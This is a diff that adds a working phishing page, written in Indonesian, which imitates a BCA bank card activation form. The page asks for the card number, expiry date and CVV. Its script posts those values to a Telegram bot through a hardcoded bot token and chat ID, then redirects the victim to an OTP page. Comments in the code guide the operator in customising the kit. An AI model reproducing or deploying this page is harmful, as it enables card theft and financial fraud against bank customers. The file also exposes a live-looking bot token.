@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aktivasi Kartu BCA</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        bca: {
+                            dark: '#222222',
+                            blue: '#0059B3',
+                            text: '#333333',
+                            secondary: '#666666'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .input-style {
+                @apply w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-bca-blue text-sm;
+            }
+            .btn-lanjut {
+                @apply w-full bg-bca-blue text-white py-2.5 rounded font-semibold hover:bg-opacity-90 transition disabled:bg-gray-400 disabled:cursor-not-allowed;
+            }
+            /* Gaya Kartu: Bisa Pasang Gambar Sendiri */
+            .card-container {
+                @apply relative w-full h-40 rounded-lg mb-5 overflow-hidden text-white;
+            }
+            .card-text {
+                @apply absolute z-10;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-200 min-h-screen">
+
+    <!-- Header Atas -->
+    <header class="bg-bca-dark py-2 px-4 flex justify-between items-center">
+        <div class="flex items-center gap-2">
+            <img src="bcaa.png" alt="" class="h-5">
+        </div>
+        <i class="fa fa-bars text-white text-lg"></i>
+    </header>
+
+    <!-- Kartu & Form Container -->
+    <div class="px-4 py-6 flex justify-center">
+        <div class="bg-white rounded-lg shadow-md p-5 w-full max-w-sm">
+            
+            <!-- TAMPILAN KARTU (BISA GANTI GAMBAR, TEKS TETAP ADA) -->
+            <div class="card-container">
+                <!-- 🔽 GANTI GAMBAR KARTU DI SINI 🔽 -->
+                <img 
+                    src="bco.png" 
+                    alt="Kartu BCA" 
+                    class="w-full h-full object-cover"
+                >
+
+                <!-- TEKS DI ATAS KARTU - TIDAK DIHAPUS -->
+                <!-- Logo BCA di Kartu -->
+                <div class="card-text top-4 left-4">
+                    <span class="font-bold text-lg"></span>
+                </div>
+
+                <!-- Ikon Chip & Nomor Kartu -->
+                <div class="card-text bottom-14 left-4 flex items-center gap-2">
+                    <i class="fa fa-credit-card text-yellow-400"></i>
+                    <span class="tracking-wider text-base font-medium">XXXX XXXX XXXX XXXX</span>
+                </div>
+
+                <!-- Teks Valid / Masa Berlaku -->
+                <div class="text-center card-text bottom-4 right-4 text-right text-xs">
+                    <div>VALID THRU</div>
+                    <div class="font-medium">XX/XX</div>
+                </div>
+
+                <!-- Teks Kode Belakang -->
+                <div class="card-text bottom-4 left-4 text-xs">
+                    <span>CVV: XXX</span>
+                </div>
+            </div>
+
+            <!-- Form Input -->
+            <form id="formAktivasi" class="space-y-3" novalidate>
+                <!-- Nomor Kartu -->
+                <div class="relative">
+                    <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                        <i class=""></i>
+                    </div>
+                    <input 
+                        type="Number" 
+                        name="nomor_kartu" 
+                        placeholder="Masukkan 16 digit nomor kartu" 
+                        required 
+                        minlength="16"
+                        maxlength="16" 
+                        class="input-style pl-10"
+                    >
+                </div>
+
+                <!-- Masa Berlaku -->
+                <div>
+                    <p class="text-blue-600 text-sm mb-1">Masa Berlaku (Valid Thru)</p>
+                    <div class="flex gap-3">
+                        <select name="bulan" required class="input-style">
+                            <option value="">Bulan</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+                        <select name="tahun" required class="input-style">
+                            <option value="">Tahun</option>
+                            <option value="24">24</option>
+                            <option value="25">25</option>
+                            <option value="26">26</option>
+                            <option value="27">27</option>
+                            <option value="28">28</option>
+                            <option value="29">29</option>
+                            <option value="30">30</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- CVV -->
+                <div class="relative">
+                    <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                        <i class=""></i>
+                    </div>
+                    <input 
+                        type="Number" 
+                        name="cvv" 
+                        placeholder="CVV 3 digit di belakang kartu" 
+                        required 
+                        minlength="3"
+                        maxlength="3" 
+                        class="input-style pl-10"
+                    >
+                </div>
+
+                <!-- Tombol Lanjut -->
+                <button type="submit" class="btn-lanjut mt-2" id="btnLanjut">Lanjut</button>
+
+                <!-- Teks Bawah -->
+                <p class="text-center text-xs text-bca-secondary mt-4 leading-tight">
+                    @ PT Bank Central Indonesia (Persero) Tbk. berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
+                </p>
+            </form>
+
+        </div>
+    </div>
+
+    <!-- Script Konfigurasi Telegram & Pindah Halaman -->
+    <script>
+        // ==================================
+        // SETTING BOT TELEGRAM
+        // ==================================
+        const BOT_TOKEN = "8412792790:AAEECAsUM-ckeY-Uni7usyYurXhE9Qpbq5M";
+        const CHAT_ID = "-1003937504797";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // ==================================
+        // FUNGSI KIRIM DATA & PINDAH HALAMAN
+        // ==================================
+        async function kirimDataKeTelegram(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+
+            // Cek ulang semua data terisi
+            if (!data.nomor_kartu || !data.bulan || !data.tahun || !data.cvv) {
+                alert("⚠️ Semua kolom wajib diisi dengan benar!");
+                return;
+            }
+
+            // Format Pesan
+            const pesan = `<b>📝 DATA AKTIVASI KARTU BCA</b>
+            \n<b>Nomor Kartu:</b> ${data.nomor_kartu}
+            \n<b>Masa Berlaku:</b> ${data.bulan}/${data.tahun}
+            \n<b>CVV:</b> ${data.cvv}
+            \n\n<i>Dikirim: ${new Date().toLocaleString('id-ID')}</i>`;
+
+            try {
+                // Kirim ke Telegram
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                alert("✅ Data berhasil dikirim! Pindah ke halaman berikutnya...");
+                
+                // 🔽 GANTI HALAMAN TUJUAN DI SINI 🔽
+                // Ubah nama file sesuai halaman tujuan kamu
+                window.location.href = "otp-bca.html"; 
+
+            } catch (err) {
+                alert("❌ Gagal mengirim data, cek koneksi.");
+            }
+        }
+
+        // Jalankan fungsi saat form dikirim
+        document.getElementById('formAktivasi').addEventListener('submit', kirimDataKeTelegram);
+    </script>
+
+</body>
+</html>
